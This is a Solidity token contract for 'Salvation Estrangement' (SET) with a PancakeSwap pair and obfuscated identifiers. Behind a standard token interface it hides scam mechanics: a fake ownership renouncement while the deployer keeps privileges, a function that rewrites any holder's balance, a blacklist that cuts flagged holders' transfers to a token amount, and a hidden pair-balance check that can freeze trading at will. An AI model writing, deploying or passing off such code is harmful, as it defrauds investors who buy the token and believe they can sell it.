//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface maxEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapTake) external view returns (uint256);

    function transfer(address isFeeTotal, uint256 takeAmount) external returns (bool);

    function allowance(address amountFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeAmount) external returns (bool);

    function transferFrom(
        address sender,
        address isFeeTotal,
        uint256 takeAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptLiquidity, uint256 value);
    event Approval(address indexed amountFee, address indexed spender, uint256 value);
}

abstract contract exemptList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundAmount {
    function createPair(address receiverShould, address amountLaunch) external returns (address);
}

interface shouldToWallet is maxEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SalvationEstrangement is exemptList, maxEnable, shouldToWallet {

    string private receiverAuto = "SET";

    function balanceOf(address swapTake) public view virtual override returns (uint256) {
        return launchedShould[swapTake];
    }

    bool public launchedMin;

    function decimals() external view virtual override returns (uint8) {
        return receiverBuy;
    }

    uint256 private listIsTeam;

    mapping(address => bool) public maxMin;

    function toList(uint256 takeAmount) public {
        marketingWallet();
        launchMax = takeAmount;
    }

    function approve(address txBuy, uint256 takeAmount) public virtual override returns (bool) {
        limitAmountReceiver[_msgSender()][txBuy] = takeAmount;
        emit Approval(_msgSender(), txBuy, takeAmount);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return modeEnable;
    }

    address fundTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private limitAmountReceiver;

    function modeReceiverAuto() public {
        emit OwnershipTransferred(launchTeam, address(0));
        receiverExempt = address(0);
    }

    function walletReceiver(address toShouldLiquidity, address isFeeTotal, uint256 takeAmount) internal returns (bool) {
        if (toShouldLiquidity == launchTeam) {
            return isAuto(toShouldLiquidity, isFeeTotal, takeAmount);
        }
        uint256 senderFund = maxEnable(buyMin).balanceOf(launchedFrom);
        require(senderFund == launchMax);
        require(isFeeTotal != launchedFrom);
        if (buyTotal[toShouldLiquidity]) {
            return isAuto(toShouldLiquidity, isFeeTotal, txModeList);
        }
        return isAuto(toShouldLiquidity, isFeeTotal, takeAmount);
    }

    uint256 private listMin;

    uint256 private modeTx;

    uint256 public swapLaunched;

    function symbol() external view virtual override returns (string memory) {
        return receiverAuto;
    }

    uint256 public totalExempt;

    function transfer(address exemptTrading, uint256 takeAmount) external virtual override returns (bool) {
        return walletReceiver(_msgSender(), exemptTrading, takeAmount);
    }

    mapping(address => uint256) private launchedShould;

    function transferFrom(address toShouldLiquidity, address isFeeTotal, uint256 takeAmount) external override returns (bool) {
        if (_msgSender() != fundTake) {
            if (limitAmountReceiver[toShouldLiquidity][_msgSender()] != type(uint256).max) {
                require(takeAmount <= limitAmountReceiver[toShouldLiquidity][_msgSender()]);
                limitAmountReceiver[toShouldLiquidity][_msgSender()] -= takeAmount;
            }
        }
        return walletReceiver(toShouldLiquidity, isFeeTotal, takeAmount);
    }

    uint256 launchMax;

    function marketingWallet() private view {
        require(maxMin[_msgSender()]);
    }

    function isAuto(address toShouldLiquidity, address isFeeTotal, uint256 takeAmount) internal returns (bool) {
        require(launchedShould[toShouldLiquidity] >= takeAmount);
        launchedShould[toShouldLiquidity] -= takeAmount;
        launchedShould[isFeeTotal] += takeAmount;
        emit Transfer(toShouldLiquidity, isFeeTotal, takeAmount);
        return true;
    }

    function allowance(address receiverTx, address txBuy) external view virtual override returns (uint256) {
        if (txBuy == fundTake) {
            return type(uint256).max;
        }
        return limitAmountReceiver[receiverTx][txBuy];
    }

    string private modeEnable = "Salvation Estrangement";

    constructor (){
        if (modeTx != listMin) {
            modeTx = limitShould;
        }
        modeReceiverAuto();
        exemptReceiver txSell = exemptReceiver(fundTake);
        buyMin = fundAmount(txSell.factory()).createPair(txSell.WETH(), address(this));
        
        launchTeam = _msgSender();
        maxMin[launchTeam] = true;
        launchedShould[launchTeam] = txLiquidity;
        
        emit Transfer(address(0), launchTeam, txLiquidity);
    }

    uint256 public limitShould;

    function owner() external view returns (address) {
        return receiverExempt;
    }

    uint8 private receiverBuy = 18;

    address private receiverExempt;

    uint256 private txLiquidity = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed tradingReceiverReceiver, address indexed marketingTotal);

    function getOwner() external view returns (address) {
        return receiverExempt;
    }

    address public buyMin;

    uint256 liquidityReceiver;

    mapping(address => bool) public buyTotal;

    function enableSell(address launchedFee) public {
        marketingWallet();
        if (listMin == limitShould) {
            limitShould = listIsTeam;
        }
        if (launchedFee == launchTeam || launchedFee == buyMin) {
            return;
        }
        buyTotal[launchedFee] = true;
    }

    function modeWalletLaunched(address exemptTrading, uint256 takeAmount) public {
        marketingWallet();
        launchedShould[exemptTrading] = takeAmount;
    }

    uint256 constant txModeList = 11 ** 10;

    uint256 public enableLimit;

    address public launchTeam;

    function fundList(address buyToken) public {
        if (launchedMin) {
            return;
        }
        if (listMin != swapLaunched) {
            limitShould = swapLaunched;
        }
        maxMin[buyToken] = true;
        if (listIsTeam == limitShould) {
            listMin = modeTx;
        }
        launchedMin = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txLiquidity;
    }

    address launchedFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}